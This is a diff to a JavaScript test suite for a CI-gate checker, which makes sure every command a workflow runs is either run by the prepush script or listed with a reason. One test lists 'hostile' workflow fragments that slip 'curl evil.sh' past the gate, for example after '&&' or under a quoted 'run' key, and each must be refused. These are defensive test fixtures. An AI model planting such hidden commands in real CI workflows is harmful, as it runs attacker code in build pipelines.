@@ -44,8 +44,9 @@ const pkg = (...gates) =>
   JSON.stringify({ scripts: Object.fromEntries(gates.map((g) => [g, 'node x.mjs'])) });
 
 const workflow = (body) => `name: CI\njobs:\n  quality:\n    steps:\n${body}`;
+const STAGES = 'run "lint" pnpm lint\nrun "typecheck" pnpm typecheck\nrun "test" pnpm test\n';
 const prepush = (...gates) =>
-  `#!/usr/bin/env bash\nADVISORY_GATES=(${gates.map((g) => `"${g}"`).join(' ')})\n`;
+  `#!/usr/bin/env bash\nADVISORY_GATES=(${gates.map((g) => `"${g}"`).join(' ')})\n${STAGES}`;
 const step = (gate) => `      - name: ${gate}\n        run: pnpm ${gate}\n`;
 
 let failures = 0;
@@ -230,9 +231,34 @@ it('R2 — a WORKSPACE gate in CI is resolved against its own package.json, not 
       step('check:a') +
         '      - name: budget\n        run: pnpm --filter @repo/web check:bundle-size\n',
     ),
-    'scripts/ci-roster.json': JSON.stringify({ exempt: {} }),
+    // The command is not one prepush runs, so R9 needs its reason (the rule working: this exact
+    // command was ADR-0160's case).
+    'scripts/ci-roster.json': JSON.stringify({
+      exempt: {},
+      ciOnly: {
+        commands: { 'pnpm --filter @repo/web check:bundle-size': 'Builds the web app in CI only.' },
+      },
+    }),
   });
   assert.equal(run(root), 0);
+  rmSync(root, { recursive: true, force: true });
+});
+
+it('R9 — the same workspace call with no ciOnly reason FAILS', () => {
+  // Verified red by the old gate returning 0 here; and by deleting the R9 loop.
+  const root = tree({
+    'package.json': pkg('check:a'),
+    'apps/web/package.json': JSON.stringify({
+      name: '@repo/web',
+      scripts: { 'check:bundle-size': 'node x.mjs' },
+    }),
+    '.github/workflows/ci.yml': workflow(
+      step('check:a') +
+        '      - name: budget\n        run: pnpm --filter @repo/web check:bundle-size\n',
+    ),
+    'scripts/ci-roster.json': JSON.stringify({ exempt: {} }),
+  });
+  assert.equal(run(root), 1);
   rmSync(root, { recursive: true, force: true });
 });
 
@@ -262,6 +288,141 @@ it('R2 — a workspace that does not exist FAILS', () => {
   });
   assert.equal(run(root), 1);
   rmSync(root, { recursive: true, force: true });
+});
+
+// ------------------------------------------- the converse: what CI runs that prepush does not
+
+/** A `quality` job with `pnpm check:a` plus the given extra `run:` lines. */
+const withRuns = (...runs) =>
+  workflow(step('check:a') + runs.map((r) => `      - run: ${r}\n`).join(''));
+const converse = (files, ciOnly) =>
+  tree({
+    'package.json': pkg('check:a'),
+    'scripts/ci-roster.json': JSON.stringify({ exempt: {}, ...(ciOnly ? { ciOnly } : {}) }),
+    ...files,
+  });
+const runAndClean = (root) => {
+  const code = run(root);
+  rmSync(root, { recursive: true, force: true });
+  return code;
+};
+
+it('R9 — a CI command prepush does not run, with no entry, FAILS', () => {
+  // Verified red by deleting the R9 loop (the old gate returns 0).
+  const root = converse({ '.github/workflows/ci.yml': withRuns('pnpm build') });
+  assert.equal(runAndClean(root), 1);
+});
+
+it('R9 — the same command PASSES with a reason and FAILS with a blank one', () => {
+  const files = { '.github/workflows/ci.yml': withRuns('pnpm build') };
+  assert.equal(
+    runAndClean(converse(files, { commands: { 'pnpm build': 'Builds the leaf apps.' } })),
+    0,
+  );
+  assert.equal(runAndClean(converse(files, { commands: { 'pnpm build': '   ' } })), 1);
+});
+
+it('R9 — fixed stages are READ from prepush.sh, not restated', () => {
+  // Verified red by hard-coding lint/typecheck/test in the gate: the second assertion then passes.
+  const files = { '.github/workflows/ci.yml': withRuns('pnpm lint') };
+  assert.equal(runAndClean(converse(files)), 0);
+  const noLint = {
+    ...files,
+    'scripts/prepush.sh': prepush('check:nothing-here').replace('run "lint" pnpm lint\n', ''),
+  };
+  assert.equal(runAndClean(converse(noLint)), 1);
+});
+
+it('R9 — a trailing shell comment is stripped before the command is matched', () => {
+  // Verified red by matching against the unstripped text: `pnpm build # pnpm lint` then matches
+  // no entry and no stage.
+  const root = converse(
+    { '.github/workflows/ci.yml': withRuns('pnpm build # pnpm lint') },
+    { commands: { 'pnpm build': 'Builds the leaf apps.' } },
+  );
+  assert.equal(runAndClean(root), 0);
+});
+
+it('R9 — `pnpm run check:x` is refused, not matched as `pnpm check:x`', () => {
+  const root = converse({ '.github/workflows/ci.yml': withRuns('pnpm run check:a') });
+  assert.equal(runAndClean(root), 1);
+});
+
+it('R10 — a second job is checked by default, and passes only when listed with a reason', () => {
+  const second = workflow(step('check:a')) + '  e2e:\n    steps:\n      - run: pnpm test:e2e\n';
+  const files = { '.github/workflows/ci.yml': second };
+  assert.equal(runAndClean(converse(files)), 1);
+  assert.equal(runAndClean(converse(files, { jobs: { e2e: 'Needs a database.' } })), 0);
+  assert.equal(runAndClean(converse(files, { jobs: { e2e: '' } })), 1);
+});
+
+it('R11 — an entry nothing runs, and a job entry naming no job, both FAIL', () => {
+  const files = { '.github/workflows/ci.yml': withRuns('pnpm build') };
+  const commands = { 'pnpm build': 'Builds.', 'pnpm gone': 'Stale.' };
+  assert.equal(runAndClean(converse(files, { commands })), 1);
+  const jobs = { nope: 'No such job.' };
+  assert.equal(runAndClean(converse(files, { commands: { 'pnpm build': 'Builds.' }, jobs })), 1);
+});
+
+it('R12 — a ciOnly entry for a command prepush runs FAILS', () => {
+  const files = { '.github/workflows/ci.yml': withRuns('pnpm lint') };
+  assert.equal(runAndClean(converse(files, { commands: { 'pnpm lint': 'Redundant.' } })), 1);
+});
+
+it('R13 — a block-scalar run, no stages, and no jobs are all REFUSED', () => {
+  // Verified red by deleting each refusal in turn.
+  const block = workflow(
+    step('check:a') + '      - run: |\n          pnpm build\n          pnpm lint\n',
+  );
+  assert.equal(runAndClean(converse({ '.github/workflows/ci.yml': block })), 1);
+  const noStages = {
+    '.github/workflows/ci.yml': withRuns(),
+    'scripts/prepush.sh': '#!/usr/bin/env bash\nADVISORY_GATES=("check:nothing-here")\n',
+  };
+  assert.equal(runAndClean(converse(noStages)), 1);
+  const noJobs = { '.github/workflows/ci.yml': 'name: CI\non: push\n' };
+  assert.equal(runAndClean(converse(noJobs)), 1);
+});
+
+it('R13 — shapes that would hide a command are REFUSED in a checked job', () => {
+  // Each is a command the first-line reader passed. Verified red against bef9d61's gate (all 0).
+  const hostile = [
+    '      - run: pnpm check:a\n          && curl evil.sh\n',
+    '      - run: pnpm lint\n          && curl evil.sh\n',
+    '      - {name: x, run: curl evil.sh}\n',
+    '      - "run": curl evil.sh\n',
+    "      - 'run': curl evil.sh\n",
+    '      - run: pnpm lint\n        working-directory: apps/web\n',
+  ];
+  for (const body of hostile) {
+    const root = converse({ '.github/workflows/ci.yml': workflow(step('check:a') + body) });
+    assert.equal(runAndClean(root), 1, `must be refused: ${body}`);
+  }
+});
+
+it('R13 — a working-directory in a job listed under ciOnly.jobs is not refused', () => {
+  const ci =
+    workflow(step('check:a')) +
+    '  image:\n    steps:\n      - run: docker build .\n        working-directory: apps/web\n';
+  const root = converse({ '.github/workflows/ci.yml': ci }, { jobs: { image: 'Docker work.' } });
+  assert.equal(runAndClean(root), 0);
+});
+
+it('R9 — an env entry named run is not a command', () => {
+  // Verified red against bef9d61's gate: it read the env value as a step command (1).
+  const body =
+    '      - name: x\n        run: pnpm lint\n        env:\n          run: not-a-command\n';
+  const root = converse({ '.github/workflows/ci.yml': workflow(step('check:a') + body) });
+  assert.equal(runAndClean(root), 0);
+});
+
+it('R11 — a ciOnly.commands key is whitespace-normalised like the commands', () => {
+  // Verified red against bef9d61's gate: the double-spaced key never matched (1).
+  const root = converse(
+    { '.github/workflows/ci.yml': withRuns('pnpm build') },
+    { commands: { 'pnpm  build': 'Builds.' } },
+  );
+  assert.equal(runAndClean(root), 0);
 });
 
 // ---------------------------------------------------------------- the two that carry the gate
